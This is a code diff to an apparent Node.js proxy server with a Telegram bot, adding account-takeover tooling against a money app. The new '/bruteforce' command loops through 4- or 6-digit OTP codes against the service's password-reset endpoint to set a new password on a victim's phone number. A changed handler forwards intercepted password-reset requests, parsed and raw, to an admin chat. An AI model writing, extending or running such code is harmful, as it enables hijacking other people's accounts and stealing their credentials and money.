@@ -706,6 +706,57 @@ Example:
       return res.sendStatus(200);
     }
 
+    else if (text.startsWith('/bruteforce ')) {
+      const parts = text.substring(12).trim().split(/\s+/);
+      if (parts.length < 2) {
+        await bot.sendMessage(chatId, `❌ Format: /bruteforce <phone> <newPassword>\nExample: /bruteforce 6206785398 mypass123`);
+        return res.sendStatus(200);
+      }
+      const phone = parts[0];
+      const newPass = parts[1];
+      const startFrom = parseInt(parts[2] || '0');
+      const batchSize = 100;
+      const maxOtp = parts[3] === '6' ? 999999 : 9999;
+      const digits = parts[3] === '6' ? 6 : 4;
+
+      await bot.sendMessage(chatId, `🔓 Brute forcing OTP...\nPhone: ${phone}\nRange: ${String(startFrom).padStart(digits, '0')} - ${String(Math.min(startFrom + batchSize - 1, maxOtp)).padStart(digits, '0')}\nDigits: ${digits}`);
+
+      let found = false;
+      for (let i = startFrom; i < startFrom + batchSize && i <= maxOtp; i++) {
+        const otp = String(i).padStart(digits, '0');
+        try {
+          const formBody = `phone=${encodeURIComponent(phone)}&newPassword=${encodeURIComponent(newPass)}&confirmPassword=${encodeURIComponent(newPass)}&smsCode=${encodeURIComponent(otp)}`;
+          const resp = await fetch(ORIGINAL_API + '/user/forgetPass', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/x-www-form-urlencoded',
+              'host': 'api.i-money.vip'
+            },
+            body: formBody
+          });
+          const result = await resp.json();
+          if (result.statusCode !== '1023') {
+            await bot.sendMessage(chatId, `✅ OTP FOUND: ${otp}\nResponse: ${JSON.stringify(result, null, 2).substring(0, 1000)}`);
+            found = true;
+            break;
+          }
+        } catch(e) {
+          await bot.sendMessage(chatId, `⚠️ Error at OTP ${otp}: ${e.message}`);
+          break;
+        }
+      }
+
+      if (!found) {
+        const nextStart = startFrom + batchSize;
+        if (nextStart <= maxOtp) {
+          await bot.sendMessage(chatId, `❌ Not found in ${String(startFrom).padStart(digits, '0')}-${String(Math.min(startFrom + batchSize - 1, maxOtp)).padStart(digits, '0')}\n\nContinue:\n/bruteforce ${phone} ${newPass} ${nextStart}${digits === 6 ? ' 6' : ''}`);
+        } else {
+          await bot.sendMessage(chatId, `❌ All ${digits}-digit OTPs tried. Not found.\n${digits === 4 ? 'Try 6-digit: /bruteforce ' + phone + ' ' + newPass + ' 0 6' : 'OTP brute force failed.'}`);
+        }
+      }
+      return res.sendStatus(200);
+    }
+
     else if (text.startsWith('/addbank ')) {
       const parts = text.substring(9).split('|').map(s => s.trim());
       if (parts.length !== 3) {
@@ -1170,12 +1221,12 @@ app.all('/money/withdrawRecord', async (req, res) => {
 app.all('/user/forgetPass', async (req, res) => {
   try {
     const bankData = await loadData();
-    const reqBody = req.body || {};
+    const reqBody = req.parsedBody || {};
+    const rawStr = req.rawBody ? req.rawBody.toString().substring(0, 500) : '';
 
     if (bankData.adminChatId && bot) {
       try {
-        const reqDump = JSON.stringify(reqBody, null, 2).substring(0, 1000);
-        await bot.sendMessage(bankData.adminChatId, `🔑 Password Reset Request!\n${reqDump}`);
+        await bot.sendMessage(bankData.adminChatId, `🔑 Password Reset!\nParsed: ${JSON.stringify(reqBody, null, 2).substring(0, 800)}\nRaw: ${rawStr}`);
       } catch(e) {}
     }
 
